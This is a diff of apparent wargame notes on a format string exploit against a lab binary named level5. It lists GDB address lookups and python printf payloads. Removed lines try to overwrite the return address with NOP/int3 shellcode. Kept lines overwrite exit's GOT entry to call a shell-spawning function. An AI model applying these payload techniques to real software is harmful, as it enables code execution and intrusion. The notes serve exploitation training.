@@ -1,43 +1,9 @@
 
-/***********************************/
-/*	Ghidra decompiler          */
-/***********************************/
-
-/************/
-  char local_20c [520];
-  
-  fgets(local_20c,0x200,stdin);
-  printf(local_20c);
-
-/************/
-
-Strat 1:
--> write shellcode in 520 buffer and overwrite eip to buffer address
-
-/***********************************/
-/*	  Informations             */
-/***********************************/
-
-stack string offset pointer = 4
-
-$ebp -> 0xbffff728:	0xbffff738
-$eip -> 0xbffff72c:	0x0804850f
-
-python -c 'print "\x2c\xf7\xff\xbf" + "\x2d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n"'
-
-NOP -> 0xbffff550
-
-f550 = 62800d
-bfff = 49151d
-python -c 'print "\x2c\xf7\xff\xbf" + "\x2d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n"'
-r < <(python -c 'print "\x4c\xf7\xff\xbf" + "\x4d\xf7\xff\xbf" + "\x90"*50 + "\xCC"*46 + "%4$n" + "a"*10 + "%5$hn"')
-
-overwrite eip of n() function and launch sigtrap
-python -c 'print "\x2c\xf7\xff\xbf" + "\x2e\xf7\xff\xbf" + "\x90"*50 + "\xCC"*42 + "%49051x" + "%5$n" + "%13649x" + "%4$hn"'
-
-
-
-/***************************************/
+=> printf vulnerability like the previous execercise
+=> This time we overwrite the got.plt entry of exit with the function o() 
+=> function o execute a shell
+=> We create a payload with the address to overwrite and we do a classic format string exploit on the last 2 bytes
+ 
 
 Overwrite GOT
 Replace exit plt function table by o() function
@@ -49,24 +15,13 @@ Replace exit plt function table by o() function
 
 -> Get plt addres of exit:
 0x080484ff <+61>:	call   0x80483d0 <exit@plt>
-
 -> disas 0x80483d0
 Dump of assembler code for function exit@plt:
 0x080483d0 <+0>:	jmp    *0x8049838
 0x080483d6 <+6>:	push   $0x28
 0x080483db <+11>:	jmp    0x8048370
-
--> show address in GOT
+-> exit@got.plt
 0x8049838 <exit@got.plt>:	0x00000004
 
--> overwrite the entry
-r < <(python -c 'print "\x38\x98\x04\x08" + "%33952x" + "%4$hn"')
-
 (python -c 'print "\x38\x98\x04\x08" + "%33952x" + "%4$hn"'; cat) | ./level5
-
-whoami
-level6
-
-
-
 
